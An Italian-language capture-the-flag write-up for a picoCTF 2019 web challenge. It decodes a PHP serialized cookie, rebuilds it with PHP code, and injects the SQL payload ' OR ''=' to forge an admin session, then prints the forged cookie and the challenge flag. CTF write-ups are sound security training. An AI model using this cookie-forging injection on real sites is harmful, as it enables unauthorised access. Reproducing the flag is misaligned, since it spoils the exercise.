---
tags:
  - WebExploitation
  - PicoCTF2019
---


## Problema

Login as admin: `https://2019shell1.picoctf.com/problem/45142/`

## Soluzione

### 1. Ottengo login con brute force
La pagina si presenta come una normale pagina di login.
Per prima cosa è necessario effettuare un attacco brute force per ottenere delle credenziali di accesso di un utente base, in particolare otteniamo

* **Username:**: `guest`
* **Password:**: `guest`

### 2. Prendo il cookie generato

Noto che mi viene fornito il seguente cookie:

`{'user_info':'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D'}`

La decodifica base64 di tale stringa fornisce:
`O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}6p`
Questo è l'output della funzione `serialize` di PHP ma con un `6p` di troppo.

### 3. Analizzo il valore del cookie

Il valore del cookie assomiglia molto ad un base64 encoding ma strambo, infatti la codifica base64 non ammette il carattere percentuale, inoltre può (ma non è obbligatorio) terminare con il carattere `=` (padding affinché la stringa sia sempre lunga unn numero divisibile per 3 caratteri).
Il valore `%25` mi suggerisce un url encoding, infatti `%25` significa il carattere `%`.
Ora ottengo `%3D` che a sua volta è l'url encoding di `=`. Bingo!
Tale cookie è infatti generato con la formula `url_encode(url_encode(STRINGA))`.

### 4. Creo il loro codice PHP per generare tale stringa

A sua volta la stringa è il risultato della funzione `serialize` di un oggetto chiamato `permissions`.
Scrivo quindi il seguente codice che simulare esattamente quanto eseguito dal server:

```php
class permissions
{
    
}

$object = new permissions();
$object->username = "guest";
$object->password = "guest";
echo(serialize($object));


echo(urlencode(urlencode(base64_encode (serialize($object)))));
```

lanciandolo ottengo infatti esattamente il valore del cookie ottenuto sopra.

### 5. Sql Injection su admin.php

Andando sulla pagina `admin.php` con il cookie ottengo il messaggio "You are not admin".
Immagino quindi che il server prenda il valore del cookie, lo deserializzi, ottenga username e password e verifichi che esista un admin con tali credenziali.
Dato che il testo del problema diceva _Login as admin_ posso intuire che l'username sia sicuramente admin, mentre non ho la password.
Devo quindi operare un attacco di sql injection sulla password in modo da ingannarlo e farmi credere di essere admin.
Modifico il codice PHP creato sopra con il seguente:

```php
class permissions
{
    
}

$object = new permissions();
$object->username = "admin";
$object->password = "' OR ''='";
echo(serialize($object));


echo(urlencode(urlencode(base64_encode (serialize($object)))));
```

e ottengo quindi il seguente valore:

`TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6OToiJyBPUiAnJz0nIjt9`

### 6. Finalmente login

Vado sulla pagina [admin.php](https://2019shell1.picoctf.com/problem/45142/admin.php), inserisco il cookie ['user_info':'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFzc3dvcmQiO3M6OToiJyBPUiAnJz0nIjt9'], F5 e ottengo la flag!

**picoCTF{41f9ada4385bd93a3b15eead30841230}**

![image](uploads/f1e0973990bd3a13df07dff9baec6136/image.png)





